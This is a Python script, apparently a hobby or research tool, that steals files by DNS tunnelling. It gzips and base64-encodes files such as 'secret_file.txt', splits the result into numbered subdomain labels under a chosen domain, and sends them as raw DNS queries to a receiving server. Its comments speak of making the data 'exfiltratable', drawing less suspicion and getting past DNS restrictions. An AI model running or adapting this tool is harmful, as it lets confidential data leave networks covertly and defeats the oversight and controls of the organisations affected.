import math
import gzip
import base64
import json
import socket
import textwrap

max_subdomain_length = 63


def make_dns_query_domain(domain):
    # https://stackoverflow.com/a/60122993
    def f(s):
        return chr(len(s)) + s

    parts = domain.split(".")
    parts = list(map(f, parts))
    return "".join(parts).encode()


def make_dns_request_data(dns_query):
    # https://stackoverflow.com/a/60122993
    req = b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    req += dns_query
    req += b"\x00\x00\x01\x00\x01"
    return req


def dns_lookup(domain, dns_server="127.0.0.1"):
    # https://stackoverflow.com/a/60122993
    dns_query = make_dns_query_domain(domain)

    req = make_dns_request_data(dns_query)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(10)

    try:
        sock.sendto(req, (dns_server, 53))
    except Exception:
        return
    finally:
        sock.close()


def construct_data_payload(filenames: list) -> dict:
    """Build a dict containing filenames and their encoded contents

    Given a list of filenames, this function opens each file (reading as bytes)
    and compresses them with gzip before converting the contents of each file to a
    base64 encoded string. This base64 string is then put into a dict with
    the filename as the key and the encoded contents as the value.

    There are certainly other more efficient means of transmitting data in a
    smaller package that would arouse less suspicion. Maybe I'll get around to
    it someday.

    Args:
        filename(list): A list of filenames to be read and encoded into an
        exfiltratable format.

    Returns:
        Dict containing filenames and their accompanying binary contents
        encoded in base64.
    """

    payload = {}
    for filename in filenames:
        with open(filename, "rb") as f:
            payload[filename] = base64.b64encode(gzip.compress(f.read())).decode(
                "utf-8"
            )

    return payload


def create_request_urls(payload: dict, domain: str) -> list:
    """Encode a dict into base64

    Args:
        payload(dict): The payload returned from construct_data_payload()
        domain(str): The name of the file with contents file_contents as a string.

    Returns:
        List of complete domains containing chunks of payload data that can be
        sent to the DNS server.
    """

    # Convert the payload dict -> JSON string -> bytes -> base64 encoded string
    payload_string = base64.b64encode(json.dumps(payload).encode("utf-8")).decode(
        "utf-8"
    )
    print(
        f"[INFO] Encoded payload string {payload_string} is length {len(payload_string)}"
    )

    # TODO: Implement algorithm for combining subdomains together optimally so that each request
    # transmits as much data as possible. This is will significantly increase the speed and
    # efficiency of data transmission.

    subdomain_count = math.ceil(
        len(payload_string) / max_subdomain_length
    )  # Round up to be safe

    subdomains = textwrap.wrap(
        payload_string, max_subdomain_length - len(f"{subdomain_count}")
    )

    # Add a number as the first character in front of the base64 string. That way
    # if things get sent in the wrong order (don't ask me how but THEY DO) we
    # can stitch them back together.
    return [
        f"{int(index)}{subdomain}.{domain}"
        for index, subdomain in enumerate(subdomains)
    ]


def send_requests(requests):

    # Get the OS to make a DNS request for our funny domain. This is
    # preferable because even if we aren't allowed to use a DNS of our
    # choice, the DNS request will make its way back to our server anyways.

    for index, request in enumerate(requests):
        print(f"Sending request {index}/{len(requests)}: {request}")
        dns_lookup(request)


if __name__ == "__main__":
    filename = "secret_file.txt"
    domain = "example.com"

    payload = construct_data_payload([filename])
    requests = create_request_urls(payload, domain)
    send_requests(requests)
